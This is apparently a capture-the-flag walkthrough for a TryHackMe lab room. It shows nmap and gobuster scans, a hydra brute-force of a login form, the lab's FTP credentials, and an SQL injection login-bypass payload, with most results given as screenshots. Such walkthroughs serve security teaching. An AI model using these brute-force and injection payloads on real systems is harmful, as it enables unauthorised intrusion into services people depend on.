# Avengers Blog

**Room Link:** [https://tryhackme.com/room/avengers](https://tryhackme.com/room/avengers)

### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>



### Scan all ports

No other ports found.

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>



**Kali**

```
git clone https://github.com/vanhauser-thc/thc-hydra.git
cd thc-hydra/
./configure
make
make install

./hydra -l groot -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top10000.txt $VICTIM http-post-form "/auth/:username=^USER^&password=^PASS^:F=Incorrect username" -V

```



## Cookies

Get the flag with developer console by checking the cookie.

<figure><img src="../../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>



## HTTP Headers

<figure><img src="../../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>

## Enumeration and FTP

**Kali**

```
ftp $VICTIM
Username: groot
Password: iamgroot
```

<figure><img src="../../.gitbook/assets/image (176).png" alt=""><figcaption></figcaption></figure>

## GoBuster

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```





## SQL Injection

<figure><img src="../../.gitbook/assets/image (177).png" alt=""><figcaption></figcaption></figure>

```
Username: ' or 1=1--
Password: ' or 1=1--
```

<figure><img src="../../.gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure>



## Remote Code Execution and Linux

<figure><img src="../../.gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>











